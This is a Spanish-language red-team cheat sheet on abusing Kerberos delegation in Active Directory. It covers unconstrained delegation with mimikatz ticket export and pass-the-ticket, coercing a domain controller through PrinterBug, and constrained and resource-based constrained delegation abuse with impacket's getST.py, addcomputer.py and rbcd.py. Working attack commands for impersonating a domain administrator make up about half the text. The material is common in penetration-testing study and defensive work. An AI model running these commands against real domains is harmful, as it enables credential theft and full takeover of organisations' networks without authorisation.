## Unconstrained Delegation: el TGT honeypot

Cuando un servidor tiene **unconstrained delegation**, cualquier usuario que se
autentique contra él deja SU TGT guardado en memoria (LSASS). Si eres admin de ese
servidor, puedes extraer los TGTs de todos los que pasaron por ahí.

```bash
# Identificar servidores con unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# En el servidor comprometido: extraer tickets
mimikatz # sekurlsa::tickets /export
# Busca .kirbi files de usuarios con privilegios

# Usar el TGT robado
mimikatz # kerberos::ptt ticket_admin@CORP.LOCAL.kirbi
```

### El ataque completo: PrinterBug + Unconstrained

1. Encuentras un servidor con unconstrained delegation donde eres admin
2. Usas **PrinterBug** (`SpoolSample.exe`) para OBLIGAR al DC a autenticarse contra
   tu servidor
3. El DC deja su TGT en tu LSASS
4. Extraes el TGT → Pass-the-Ticket → eres el DC

## Constrained Delegation: S4U2Self + S4U2Proxy

Constrained delegation solo permite impersonar servicios ESPECÍFICOS (SPNs).
Pero hay un bug: si puedes modificar el atributo `msDS-AllowedToDelegateTo`:

```bash
# Con impacket (desde Linux):
getST.py -spn cifs/dc01.corp.local -impersonate administrator corp.local/svc_account:password
# Genera un ticket como administrator para el servicio cifs en dc01
```

## RBCD (Resource-Based Constrained Delegation)

El más moderno: la delegación se configura EN el recurso (no en la cuenta).
Si puedes modificar `msDS-AllowedToActAsOther` de un objeto:

```bash
# 1. Crear una cuenta de ordenador falsa
addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ss' corp.local/user:pass

# 2. Configurar RBCD en el objetivo
rbcd.py -delegate-to dc01 -delegate-from EVIL$ -action write corp.local/user:pass

# 3. Pedir tickets impersonando admin
getST.py -spn cifs/dc01.corp.local -impersonate administrator corp.local/EVIL$:P@ss
```

RBCD es especialmente peligroso porque solo necesitas WRITE sobre el objeto
objetivo (no Domain Admin).
